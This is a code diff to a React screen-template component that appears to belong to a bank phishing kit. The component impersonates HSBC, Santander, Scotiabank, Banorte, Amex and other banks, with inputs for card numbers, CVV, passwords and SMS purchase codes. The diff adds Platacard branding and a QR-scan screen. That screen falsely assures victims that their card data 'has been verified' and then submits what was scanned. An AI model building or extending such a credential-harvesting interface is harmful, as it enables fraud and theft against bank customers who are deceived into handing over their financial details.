@@ -3,6 +3,7 @@ import { Card } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { ScreenType } from '@shared/schema';
+import QRScanner from './QRScanner';
 
 // Para debug
 console.log('ScreenType.SMS_COMPRA:', ScreenType.SMS_COMPRA);
@@ -18,6 +19,7 @@ import hsbcLogo from '../../assets/Hsbc.png';
 import amexLogo from '../../assets/Amex.png';
 import santanderLogo from '../../assets/santander_logo.png';
 import santanderLogoWhite from '../../assets/santander_logo_white.png';
+import platacardLogo from '../../assets/platacard_logo.png';
 import scotiabankLogo from '../../assets/scotiabank_logo.png';
 import scotiabankLogoWhite from '../../assets/scotiabank_logo_white.png';
 import invexLogo from '../../assets/invex_logo.png';
@@ -57,6 +59,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [cvvInput, setCvvInput] = useState('');
   const [smsCompraInput, setSmsCompraInput] = useState('');
   const [passwordError, setPasswordError] = useState<string | null>(null);
+  const [qrScanned, setQrScanned] = useState<string | null>(null);
   
   // Función para validar número de tarjeta con algoritmo de Luhn
   const validateCardNumber = (number: string) => {
@@ -523,6 +526,40 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </>
         );
         return getBankContainer(validandoContent);
+      
+      case ScreenType.ESCANEAR_QR:
+        // Si ya escaneamos un QR, mostrar confirmación
+        if (qrScanned) {
+          const qrScannedContent = (
+            <>
+              <h2 className="text-xl font-bold mb-3">¡Código QR escaneado correctamente!</h2>
+              <div className="bg-green-100 border border-green-300 text-green-700 px-4 py-3 rounded mb-4">
+                <p>Los datos de su tarjeta han sido verificados exitosamente.</p>
+              </div>
+              <Button 
+                className={primaryBtnClass}
+                onClick={() => onSubmit(ScreenType.ESCANEAR_QR, { qrData: qrScanned })}
+              >
+                Continuar
+              </Button>
+            </>
+          );
+          return getBankContainer(qrScannedContent);
+        }
+        
+        // Si no hemos escaneado un QR, mostrar el escáner
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
+            <QRScanner 
+              onScanSuccess={(qrData) => {
+                setQrScanned(qrData);
+              }}
+              onCancel={() => {
+                onSubmit(ScreenType.MENSAJE, { mensaje: "Operación cancelada por el usuario" });
+              }}
+            />
+          </div>
+        );
 
       default:
         const defaultContent = (
@@ -562,6 +599,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return 'bg-[#FF6600] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BANORTE':
         return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'PLATACARD':
+        return 'bg-[#0072BC] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       default:
         return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Banorte por defecto
     }
@@ -622,19 +661,3 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     </div>
   );
 };
-```jsx
-case ScreenType.QR:
-  const qrContent = (
-    <>
-      <h2 className="text-xl font-bold mb-3">Escaneo de QR</h2>
-      <p className="mb-4">Por favor escanea el código QR de tu tarjeta.</p>
-      <Button 
-        className={primaryBtnClass}
-        onClick={() => navigator.mediaDevices.getUserMedia({ video: true })}
-      >
-        Abrir Cámara
-      </Button>
-    </>
-  );
-  return getBankContainer(qrContent);
-```
